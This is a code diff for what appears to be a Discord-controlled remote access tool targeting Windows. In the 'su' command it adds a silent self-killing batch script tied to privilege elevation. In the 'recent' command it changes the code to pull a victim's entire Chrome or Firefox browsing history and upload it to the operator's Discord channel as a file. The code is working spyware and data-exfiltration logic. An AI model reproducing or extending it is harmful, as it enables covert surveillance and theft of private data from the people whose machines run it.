@@ -618,20 +618,33 @@ async def su(ctx):
             f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}"
         )
 
-        await asyncio.sleep(3)
-        if ctypes.windll.shell32.IsUserAnAdmin():
-            batch_script = f"""
-            @echo off
-            timeout /t 3 /nobreak >nul
-            taskkill /pid {current_pid} /f
-            del "%~f0"
-            """
-            temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
-            with open(temp_bat, "w") as f:
-                f.write(batch_script)
-            subprocess.Popen(
-                temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
-            )
+        async def check_admin_message():
+            for _ in range(40):
+                await asyncio.sleep(1)
+                for channel in bot.get_all_channels():
+                    if isinstance(channel, discord.TextChannel):
+                        async for message in channel.history(limit=5):
+                            if (
+                                message.author == bot.user
+                                and "✅ **Connected - !help for command info." in message.content
+                                and datetime.utcnow() - message.created_at < timedelta(seconds=40)
+                            ):
+                                batch_script = f"""
+                                @echo off
+                                timeout /t 3 /nobreak >nul
+                                taskkill /pid {current_pid} /f
+                                del "%~f0"
+                                """
+                                temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
+                                with open(temp_bat, "w") as f:
+                                    f.write(batch_script)
+                                subprocess.Popen(
+                                    temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
+                                )
+                                return
+
+        await check_admin_message()
+
     except Exception as e:
         await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")
 
@@ -691,8 +704,7 @@ async def recent(ctx, browser: str = "chrome"):
                         SELECT urls.url, urls.title, visits.visit_time 
                         FROM urls 
                         JOIN visits ON urls.id = visits.url 
-                        ORDER BY visits.visit_time DESC 
-                        LIMIT 100
+                        ORDER BY visits.visit_time DESC
                     """
                     )
 
@@ -750,8 +762,7 @@ async def recent(ctx, browser: str = "chrome"):
                         SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                         FROM moz_places 
                         JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
-                        ORDER BY moz_historyvisits.visit_date DESC 
-                        LIMIT 100
+                        ORDER BY moz_historyvisits.visit_date DESC
                     """
                     )
 
@@ -787,20 +798,19 @@ async def recent(ctx, browser: str = "chrome"):
             await ctx.send(f"❌ No browsing history found.{watermark()}")
             return
 
-        output = []
-        for i, entry in enumerate(history[:50], 1):
-            output.append(f"{i}. [{entry['time']}] {entry['title']}\n   {entry['url']}")
+        filename = f"history_{browser}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(filename, "w", encoding="utf-8") as f:
+            for entry in history:
+                f.write(
+                    f"[{entry['time']}] {entry['title']}\n{entry['url']}\nBrowser: {entry['browser']}\n\n"
+                )
 
-        message = (
-            f"🌐 Recent browsing history from {browser.capitalize()}:\n"
-            + "\n".join(output)
-            + watermark()
-        )
-        if len(message) > 2000:
-            for i in range(0, len(message), 2000):
-                await ctx.send(message[i : i + 2000])
-        else:
-            await ctx.send(message)
+        await ctx.send(file=File(filename), content=f"📎 All browsing history from {browser.capitalize()} sent as file.{watermark()}")
+
+        try:
+            os.remove(filename)
+        except:
+            pass
 
     except Exception as e:
         await ctx.send(
